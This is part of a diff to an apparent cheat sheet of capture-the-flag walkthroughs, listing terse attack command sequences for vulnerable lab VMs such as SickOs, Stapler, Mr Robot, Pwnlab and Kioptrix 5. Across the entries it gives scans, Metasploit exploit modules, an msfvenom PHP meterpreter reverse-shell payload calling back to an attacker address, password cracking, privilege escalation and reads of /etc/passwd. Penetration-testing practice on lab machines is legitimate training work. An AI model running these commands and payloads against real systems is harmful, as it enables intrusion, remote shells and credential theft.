 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw
 http://192.168.1.108/shell.php?
@@ -9720,7 +10819,10 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 
 
 
+
+Challenge Name: Hack Kevgir Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-kevgir-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.102
 joomscan -u http://192.168.1.102:8081
@@ -9744,7 +10846,10 @@ su admin
 
 
 
+
+Challenge Name: Hack Simple Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-simple-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.106
 searchsploit cutenews 2.0.3
@@ -9767,7 +10872,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Sickos 2 1 Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-sickos-2-1-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.109
 dirb http://192.168.1.109
@@ -9788,7 +10896,10 @@ cat 7d83aaa2bf93d8040f3f22ec6ad9d5a.txt
 
 
 
+
+Challenge Name: Hack Sickos 1 1 Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-sickos-1-1-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.101
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 –f raw
@@ -9806,7 +10917,10 @@ ls
 
 
 
+
+Challenge Name: Hack Sydney Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-sydney-vm-ctf-challenge/
+
 netdiscover
 nmap -A -p- 192.168.1.103
 crunch 7 7 -t mos%%%% -o /root/Desktop/dict.txt
@@ -9836,7 +10950,10 @@ unzip flag.zip
 
 
 
+
+Challenge Name: Hack Stapler Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-stapler-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.126
 wpscan -u https://192.168.1.126/blogblog/ --enumerate at --enumerate ap --enumerate u --disable-tls-checks
@@ -9866,7 +10983,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack Droopy Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-droopy-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.102
 use exploit/multi/http/drupal_drupageddon
@@ -9884,7 +11004,10 @@ truecrack --truecrypt /root/Downloads/dave.tc -k SHA512 -w /root/Desktop/dict.tx
 
 
 
+
+Challenge Name: Hack Mr Robot Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-mr-robot-vm-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.103
 nitko -h 192.168.1.103
@@ -9916,7 +11039,10 @@ cat key-3-of-3.txt
 
 
 
+
+Challenge Name: Penetration Testing Pwnlab Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/penetration-testing-pwnlab-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.103
 nikto -h http://192.168.1.103
@@ -9960,7 +11086,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Kioptrix 5 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-kioptrix-5-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.159
 msf > use exploit/multi/http/phptax_exec
@@ -9979,7 +11108,10 @@ cat congrats.txt
 
 
 
+
+Challenge Name: Hack The Lampsecurity Ctf8 Ctf Challenge 2
 Challenge URL: https://www.hackingarticles.in/hack-the-lampsecurity-ctf8-ctf-challenge-2/
+
 nmap –A 192.168.1.112
 nikto -h 192.168.1.112
 dirb http://192.168.1.112/content
@@ -10008,5 +11140,6 @@ sudo su
 ls
 cat flag.txt
 cat /etc/passwd
+
 
 
